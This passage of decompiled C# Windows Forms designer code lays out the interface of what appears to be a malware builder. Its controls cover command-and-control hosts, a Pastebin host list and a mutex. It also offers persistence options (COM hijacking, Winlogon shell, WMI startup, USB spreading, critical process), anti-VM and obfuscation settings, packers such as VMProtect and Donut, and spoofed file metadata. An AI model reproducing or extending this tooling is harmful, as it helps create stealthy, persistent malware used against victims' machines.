		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.checkBox4 = new System.Windows.Forms.CheckBox();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.checkBox1 = new System.Windows.Forms.CheckBox();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.checkBox20 = new System.Windows.Forms.CheckBox();
		this.rjTextBox9 = new CustomControls.RJControls.RJTextBox();
		this.checkBox2 = new System.Windows.Forms.CheckBox();
		this.checkBox22 = new System.Windows.Forms.CheckBox();
		this.checkBoxAntiVirtual = new System.Windows.Forms.CheckBox();
		this.checkBoxCtrlFlow = new System.Windows.Forms.CheckBox();
		this.checkBoxJunk = new System.Windows.Forms.CheckBox();
		this.checkBoxProxyInt = new System.Windows.Forms.CheckBox();
		this.checkBoxRename = new System.Windows.Forms.CheckBox();
		this.checkBoxMixer = new System.Windows.Forms.CheckBox();
		this.checkBoxProtectInt = new System.Windows.Forms.CheckBox();
		this.checkBoxProxyString = new System.Windows.Forms.CheckBox();
		this.panel4 = new System.Windows.Forms.Panel();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		this.rjButtonGenerateAssembly = new CustomControls.RJControls.RJButton();
		this.checkBox21 = new System.Windows.Forms.CheckBox();
		this.TextBoxFileVersion = new CustomControls.RJControls.RJTextBox();
		this.TextBoxProductVersion = new CustomControls.RJControls.RJTextBox();
		this.TextBoxOriginalFileName = new CustomControls.RJControls.RJTextBox();
		this.TextBoxTrademarks = new CustomControls.RJControls.RJTextBox();
		this.TextBoxCopyright = new CustomControls.RJControls.RJTextBox();
		this.TextBoxCompany = new CustomControls.RJControls.RJTextBox();
		this.TextBoxDescription = new CustomControls.RJControls.RJTextBox();
		this.TextBoxProduct = new CustomControls.RJControls.RJTextBox();
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.rjButton21 = new CustomControls.RJControls.RJButton();
		this.rjButton20 = new CustomControls.RJControls.RJButton();
		this.rjButton19 = new CustomControls.RJControls.RJButton();
		this.rjButton18 = new CustomControls.RJControls.RJButton();
		this.rjButton17 = new CustomControls.RJControls.RJButton();
		this.rjButton16 = new CustomControls.RJControls.RJButton();
		this.rjComboBox3 = new CustomControls.RJControls.RJComboBox();
		this.rjButtonBuildJar = new CustomControls.RJControls.RJButton();
		this.rjButtonBuildVMP = new CustomControls.RJControls.RJButton();
		this.rjButtonBuildReactor = new CustomControls.RJControls.RJButton();
		this.rjButtonBuildMpress = new CustomControls.RJControls.RJButton();
		this.rjButtonBuildDonut = new CustomControls.RJControls.RJButton();
		this.rjButtonBuildSFX = new CustomControls.RJControls.RJButton();
		this.rjButton10 = new CustomControls.RJControls.RJButton();
		this.rjButton9 = new CustomControls.RJControls.RJButton();
		this.rjButton8 = new CustomControls.RJControls.RJButton();
		this.rjButton7 = new CustomControls.RJControls.RJButton();
		this.rjButton6 = new CustomControls.RJControls.RJButton();
		this.rjButton5 = new CustomControls.RJControls.RJButton();
		this.checkBox11 = new System.Windows.Forms.CheckBox();
		this.rjComboBox4 = new CustomControls.RJControls.RJComboBox();
		this.rjTextBox10 = new CustomControls.RJControls.RJTextBox();
		this.checkBox12 = new System.Windows.Forms.CheckBox();
		this.rjTextBox11 = new CustomControls.RJControls.RJTextBox();
		this.checkBox13 = new System.Windows.Forms.CheckBox();
		this.rjTextBox12 = new CustomControls.RJControls.RJTextBox();
		this.checkBox14 = new System.Windows.Forms.CheckBox();
		this.rjTextBox13 = new CustomControls.RJControls.RJTextBox();
		this.rjComboBox5 = new CustomControls.RJControls.RJComboBox();
		this.tabPage5 = new System.Windows.Forms.TabPage();
		this.GridBuilds = new System.Windows.Forms.DataGridView();
		this.ColumnBuildName = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnGroup = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnProcess = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnUsers = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnDateCreated = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnBuildPath = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuBuilds = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.menuDelete = new System.Windows.Forms.ToolStripMenuItem();
		this.menuClear = new System.Windows.Forms.ToolStripMenuItem();
		this.imageList1 = new System.Windows.Forms.ImageList(this.components);
		this.checkBox10 = new System.Windows.Forms.CheckBox();
		this.checkBox15 = new System.Windows.Forms.CheckBox();
		this.materialTabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridIps).BeginInit();
		this.tabPage2.SuspendLayout();
		this.panel1.SuspendLayout();
		this.tabPage3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.panel4.SuspendLayout();
		this.tabPage4.SuspendLayout();
		this.tabPage5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridBuilds).BeginInit();
		this.contextMenuBuilds.SuspendLayout();
		base.SuspendLayout();
		this.materialTabControl1.Controls.Add(this.tabPage1);
		this.materialTabControl1.Controls.Add(this.tabPage2);
		this.materialTabControl1.Controls.Add(this.tabPage3);
		this.materialTabControl1.Controls.Add(this.tabPage4);
		this.materialTabControl1.Controls.Add(this.tabPage5);
		this.materialTabControl1.Depth = 0;
		this.materialTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.materialTabControl1.ImageList = this.imageList1;
		this.materialTabControl1.Location = new System.Drawing.Point(3, 64);
		this.materialTabControl1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialTabControl1.Multiline = true;
		this.materialTabControl1.Name = "materialTabControl1";
		this.materialTabControl1.SelectedIndex = 0;
		this.materialTabControl1.Size = new System.Drawing.Size(873, 425);
		this.materialTabControl1.TabIndex = 0;
		this.tabPage1.Controls.Add(this.rjButton15);
		this.tabPage1.Controls.Add(this.rjButton14);
		this.tabPage1.Controls.Add(this.rjButton13);
		this.tabPage1.Controls.Add(this.rjButton12);
		this.tabPage1.Controls.Add(this.rjButton11);
		this.tabPage1.Controls.Add(this.rjButton4);
		this.tabPage1.Controls.Add(this.rjTextBox6);
		this.tabPage1.Controls.Add(this.rjTextBox7);
		this.tabPage1.Controls.Add(this.rjButton2);
		this.tabPage1.Controls.Add(this.rjTextBox1);
		this.tabPage1.Controls.Add(this.rjButton1);
		this.tabPage1.Controls.Add(this.GridIps);
		this.tabPage1.Controls.Add(this.rjTextBox8);
		this.tabPage1.Controls.Add(this.checkBox3);
		this.tabPage1.ImageKey = "server_78939.png";
		this.tabPage1.Location = new System.Drawing.Point(4, 23);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(865, 398);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Connect";
		this.tabPage1.UseVisualStyleBackColor = true;
		this.rjButton15.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton15.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton15.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton15.BorderRadius = 0;
		this.rjButton15.BorderSize = 0;
		this.rjButton15.FlatAppearance.BorderSize = 0;
		this.rjButton15.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton15.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton15.ForeColor = System.Drawing.Color.White;
		this.rjButton15.Location = new System.Drawing.Point(602, 91);
		this.rjButton15.Name = "rjButton15";
		this.rjButton15.Size = new System.Drawing.Size(154, 31);
		this.rjButton15.TabIndex = 53;
		this.rjButton15.Text = "Reset";
		this.rjButton15.TextColor = System.Drawing.Color.White;
		this.rjButton15.UseVisualStyleBackColor = false;
		this.rjButton15.Click += new System.EventHandler(rjButton15_Click);
		this.rjButton14.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton14.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton14.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton14.BorderRadius = 0;
		this.rjButton14.BorderSize = 0;
		this.rjButton14.FlatAppearance.BorderSize = 0;
		this.rjButton14.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton14.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton14.ForeColor = System.Drawing.Color.White;
		this.rjButton14.Location = new System.Drawing.Point(477, 91);
		this.rjButton14.Name = "rjButton14";
		this.rjButton14.Size = new System.Drawing.Size(118, 31);
		this.rjButton14.TabIndex = 52;
		this.rjButton14.Text = "Import'IP'p";
		this.rjButton14.TextColor = System.Drawing.Color.White;
		this.rjButton14.UseVisualStyleBackColor = false;
		this.rjButton14.Click += new System.EventHandler(rjButton14_Click);
		this.rjButton13.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton13.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton13.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton13.BorderRadius = 0;
		this.rjButton13.BorderSize = 0;
		this.rjButton13.FlatAppearance.BorderSize = 0;
		this.rjButton13.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton13.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton13.ForeColor = System.Drawing.Color.White;
		this.rjButton13.Location = new System.Drawing.Point(355, 91);
		this.rjButton13.Name = "rjButton13";
		this.rjButton13.Size = new System.Drawing.Size(118, 31);
		this.rjButton13.TabIndex = 51;
		this.rjButton13.Text = "Import'IP's";
		this.rjButton13.TextColor = System.Drawing.Color.White;
		this.rjButton13.UseVisualStyleBackColor = false;
		this.rjButton13.Click += new System.EventHandler(rjButton13_Click);
		this.rjButton12.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton12.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton12.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton12.BorderRadius = 0;
		this.rjButton12.BorderSize = 0;
		this.rjButton12.FlatAppearance.BorderSize = 0;
		this.rjButton12.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton12.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton12.ForeColor = System.Drawing.Color.White;
		this.rjButton12.Location = new System.Drawing.Point(682, 13);
		this.rjButton12.Name = "rjButton12";
		this.rjButton12.Size = new System.Drawing.Size(74, 31);
		this.rjButton12.TabIndex = 50;
		this.rjButton12.Text = "Import";
		this.rjButton12.TextColor = System.Drawing.Color.White;
		this.rjButton12.UseVisualStyleBackColor = false;
		this.rjButton12.Click += new System.EventHandler(rjButton12_Click);
		this.rjButton11.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton11.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton11.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton11.BorderRadius = 0;
		this.rjButton11.BorderSize = 0;
		this.rjButton11.FlatAppearance.BorderSize = 0;
		this.rjButton11.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton11.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton11.ForeColor = System.Drawing.Color.White;
		this.rjButton11.Location = new System.Drawing.Point(602, 13);
		this.rjButton11.Name = "rjButton11";
		this.rjButton11.Size = new System.Drawing.Size(74, 31);
		this.rjButton11.TabIndex = 49;
		this.rjButton11.Text = "Save to";
		this.rjButton11.TextColor = System.Drawing.Color.White;
		this.rjButton11.UseVisualStyleBackColor = false;
		this.rjButton11.Click += new System.EventHandler(rjButton11_Click);
		this.rjButton4.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton4.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton4.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton4.BorderRadius = 0;
		this.rjButton4.BorderSize = 0;
		this.rjButton4.FlatAppearance.BorderSize = 0;
		this.rjButton4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton4.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton4.ForeColor = System.Drawing.Color.White;
		this.rjButton4.Location = new System.Drawing.Point(602, 52);
		this.rjButton4.Name = "rjButton4";
		this.rjButton4.Size = new System.Drawing.Size(154, 31);
		this.rjButton4.TabIndex = 48;
		this.rjButton4.Text = "Generate";
		this.rjButton4.TextColor = System.Drawing.Color.White;
		this.rjButton4.UseVisualStyleBackColor = false;
		this.rjButton4.Click += new System.EventHandler(rjButton4_Click);
		this.rjTextBox6.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox6.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox6.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox6.BorderRadius = 0;
		this.rjTextBox6.BorderSize = 1;
		this.rjTextBox6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox6.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox6.Location = new System.Drawing.Point(355, 52);
		this.rjTextBox6.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox6.Multiline = false;
		this.rjTextBox6.Name = "rjTextBox6";
		this.rjTextBox6.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox6.PasswordChar = false;
		this.rjTextBox6.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox6.PlaceholderText = "Mutex";
		this.rjTextBox6.Size = new System.Drawing.Size(240, 31);
		this.rjTextBox6.TabIndex = 47;
		this.rjTextBox6.Texts = "";
		this.rjTextBox6.UnderlinedStyle = false;
		this.rjTextBox7.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox7.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox7.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox7.BorderRadius = 0;
		this.rjTextBox7.BorderSize = 1;
		this.rjTextBox7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox7.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox7.Location = new System.Drawing.Point(355, 13);
		this.rjTextBox7.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox7.Multiline = false;
		this.rjTextBox7.Name = "rjTextBox7";
		this.rjTextBox7.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox7.PasswordChar = false;
		this.rjTextBox7.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox7.PlaceholderText = "Group";
		this.rjTextBox7.Size = new System.Drawing.Size(240, 31);
		this.rjTextBox7.TabIndex = 31;
		this.rjTextBox7.Texts = "";
		this.rjTextBox7.UnderlinedStyle = false;
		this.rjButton2.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 0;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.Font = new System.Drawing.Font("Arial", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton2.ForeColor = System.Drawing.Color.White;
		this.rjButton2.Location = new System.Drawing.Point(316, 13);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(32, 31);
		this.rjButton2.TabIndex = 14;
		this.rjButton2.Text = "-";
		this.rjButton2.TextColor = System.Drawing.Color.White;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjButton2.Click += new System.EventHandler(rjButton2_Click);
		this.rjTextBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox1.Location = new System.Drawing.Point(21, 13);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Host";
		this.rjTextBox1.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox1.TabIndex = 13;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.Font = new System.Drawing.Font("Arial", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(278, 13);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(32, 31);
		this.rjButton1.TabIndex = 12;
		this.rjButton1.Text = "+";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.GridIps.AllowUserToAddRows = false;
		this.GridIps.AllowUserToDeleteRows = false;
		this.GridIps.AllowUserToResizeColumns = false;
		this.GridIps.AllowUserToResizeRows = false;
		this.GridIps.BackgroundColor = System.Drawing.Color.White;
		this.GridIps.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridIps.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridIps.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.GridIps.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridIps.Columns.AddRange(this.Column1);
		this.GridIps.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle10.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridIps.DefaultCellStyle = dataGridViewCellStyle10;
		this.GridIps.EnableHeadersVisualStyles = false;
		this.GridIps.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridIps.Location = new System.Drawing.Point(21, 50);
		this.GridIps.Name = "GridIps";
		this.GridIps.ReadOnly = true;
		this.GridIps.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle14.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle14.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle14.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.RowHeadersDefaultCellStyle = dataGridViewCellStyle14;
		this.GridIps.RowHeadersVisible = false;
		this.GridIps.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridIps.ShowCellErrors = false;
		this.GridIps.ShowCellToolTips = false;
		this.GridIps.ShowEditingIcon = false;
		this.GridIps.ShowRowErrors = false;
		this.GridIps.Size = new System.Drawing.Size(327, 278);
		this.GridIps.TabIndex = 11;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "Host";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.rjTextBox8.BackColor = System.Drawing.Color.White;
		this.rjTextBox8.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox8.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox8.BorderRadius = 0;
		this.rjTextBox8.BorderSize = 1;
		this.rjTextBox8.Enabled = false;
		this.rjTextBox8.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox8.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox8.Location = new System.Drawing.Point(21, 358);
		this.rjTextBox8.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox8.Multiline = false;
		this.rjTextBox8.Name = "rjTextBox8";
		this.rjTextBox8.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox8.PasswordChar = false;
		this.rjTextBox8.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox8.PlaceholderText = "Pastebin Raw URL (https://pastebin.com/raw/XXXXX)";
		this.rjTextBox8.Size = new System.Drawing.Size(327, 31);
		this.rjTextBox8.TabIndex = 51;
		this.rjTextBox8.Texts = "";
		this.rjTextBox8.UnderlinedStyle = false;
		this.checkBox3.AutoSize = true;
		this.checkBox3.ForeColor = System.Drawing.Color.Black;
		this.checkBox3.Location = new System.Drawing.Point(21, 334);
		this.checkBox3.Name = "checkBox3";
		this.checkBox3.Size = new System.Drawing.Size(67, 17);
		this.checkBox3.TabIndex = 67;
		this.checkBox3.Text = "Pastebin";
		this.checkBox3.UseVisualStyleBackColor = true;
		this.tabPage2.Controls.Add(this.panel1);
		this.tabPage2.Controls.Add(this.checkBox1);
		this.tabPage2.ImageKey = "settings-cogwheel-button_icon-icons.com_72559.png";
		this.tabPage2.Location = new System.Drawing.Point(4, 23);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(865, 398);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Install Services";
		this.tabPage2.UseVisualStyleBackColor = true;
		this.panel1.Controls.Add(this.checkBoxWinlogonShell);
		this.panel1.Controls.Add(this.checkBoxReserved);
		this.panel1.Controls.Add(this.rjTextBoxReserved);
		this.panel1.Controls.Add(this.checkBoxWMIStartup);
		this.panel1.Controls.Add(this.rjTextBoxWMIStartup);
		this.panel1.Controls.Add(this.checkBoxUSBSpread);
		this.panel1.Controls.Add(this.rjTextBoxUSBSpread);
		this.panel1.Controls.Add(this.checkBoxWindowsService);
		this.panel1.Controls.Add(this.rjTextBoxWindowsService);
		this.panel1.Controls.Add(this.checkBoxProcessCritical);
		this.panel1.Controls.Add(this.rjTextBoxProcessCritical);
		this.panel1.Controls.Add(this.checkBoxCmdlineAutorun);
		this.panel1.Controls.Add(this.rjComboBoxCmdlineDir);
		this.panel1.Controls.Add(this.rjTextBoxCmdlineProcess);
		this.panel1.Controls.Add(this.checkBox7);
		this.panel1.Controls.Add(this.checkBox9);
		this.panel1.Controls.Add(this.checkBox8);
		this.panel1.Controls.Add(this.rjTextBox5);
		this.panel1.Controls.Add(this.checkBox6);
		this.panel1.Controls.Add(this.rjComboBox2);
		this.panel1.Controls.Add(this.rjTextBox4);
		this.panel1.Controls.Add(this.checkBox5);
		this.panel1.Controls.Add(this.rjComboBox1);
		this.panel1.Controls.Add(this.rjTextBox3);
		this.panel1.Controls.Add(this.checkBox4);
		this.panel1.Controls.Add(this.rjTextBox2);
		this.panel1.Enabled = false;
		this.panel1.Location = new System.Drawing.Point(6, 68);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(783, 324);
		this.panel1.TabIndex = 1;
		this.checkBoxWinlogonShell.AutoSize = true;
		this.checkBoxWinlogonShell.Location = new System.Drawing.Point(12, 29);
		this.checkBoxWinlogonShell.Name = "checkBoxWinlogonShell";
		this.checkBoxWinlogonShell.Size = new System.Drawing.Size(97, 17);
		this.checkBoxWinlogonShell.TabIndex = 33;
		this.checkBoxWinlogonShell.Text = "Winlogon Shell";
		this.checkBoxWinlogonShell.UseVisualStyleBackColor = true;
		this.checkBoxReserved.AutoSize = true;
		this.checkBoxReserved.Location = new System.Drawing.Point(12, 7);
		this.checkBoxReserved.Name = "checkBoxReserved";
		this.checkBoxReserved.Size = new System.Drawing.Size(97, 17);
		this.checkBoxReserved.TabIndex = 36;
		this.checkBoxReserved.Text = "COM Hijacking";
		this.checkBoxReserved.UseVisualStyleBackColor = true;
		this.checkBoxReserved.CheckedChanged += new System.EventHandler(checkBoxReserved_CheckedChanged);
		this.rjTextBoxReserved.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBoxReserved.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxReserved.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxReserved.BorderRadius = 0;
		this.rjTextBoxReserved.BorderSize = 1;
		this.rjTextBoxReserved.Enabled = false;
		this.rjTextBoxReserved.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBoxReserved.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxReserved.Location = new System.Drawing.Point(229, 7);
		this.rjTextBoxReserved.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxReserved.Multiline = false;
		this.rjTextBoxReserved.Name = "rjTextBoxReserved";
		this.rjTextBoxReserved.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxReserved.PasswordChar = false;
		this.rjTextBoxReserved.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxReserved.PlaceholderText = "COM CLSID (optional)";
		this.rjTextBoxReserved.Size = new System.Drawing.Size(250, 31);
		this.rjTextBoxReserved.TabIndex = 37;
		this.rjTextBoxReserved.Texts = "";
		this.rjTextBoxReserved.UnderlinedStyle = false;
		this.rjTextBoxReserved.Visible = false;
		this.checkBoxWMIStartup.AutoSize = true;
		this.checkBoxWMIStartup.Location = new System.Drawing.Point(301, 22);
		this.checkBoxWMIStartup.Name = "checkBoxWMIStartup";
		this.checkBoxWMIStartup.Size = new System.Drawing.Size(86, 17);
		this.checkBoxWMIStartup.TabIndex = 38;
		this.checkBoxWMIStartup.Text = "WMI Startup";
		this.checkBoxWMIStartup.UseVisualStyleBackColor = true;
		this.checkBoxWMIStartup.CheckedChanged += new System.EventHandler(checkBoxWMIStartup_CheckedChanged);
		this.rjTextBoxWMIStartup.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBoxWMIStartup.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxWMIStartup.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxWMIStartup.BorderRadius = 0;
		this.rjTextBoxWMIStartup.BorderSize = 1;
		this.rjTextBoxWMIStartup.Enabled = false;
